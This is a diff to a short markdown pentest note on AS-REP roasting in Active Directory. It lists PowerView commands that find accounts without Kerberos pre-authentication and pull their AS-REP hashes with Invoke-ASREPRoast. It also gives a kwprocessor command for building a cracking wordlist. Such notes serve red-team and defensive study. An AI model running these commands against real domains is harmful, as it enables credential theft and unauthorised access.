@@ -12,15 +12,14 @@ as well as hamrj0y's powerview tips
 
 [https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
 
-
-
 Determine if kerberos pre-auth is not set
 
 ```
-With Powerview
+#With Powerview
 
-Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
-Get-ASREPHash -UserName victim -Domain testlab.local -Verbose
+# check for users who don't have kerberos preauthentication set
+Get-DomainUser -PreauthNotRequired
+Get-DomainUser -UACFilter DONT_REQ_PREAUTH
 Invoke-ASREPRoast -Verbose | fl
 ```
 
@@ -29,8 +28,6 @@ Note: A great tool for cracking hashes is kwprocessor
 ```
 ./kwp -z basechars/full.base keymaps/en.keymap routes/2-to-16-max-3-direction-changes.route > largekwpshift.txt
 ```
-
-
 
 [http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/](http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
 
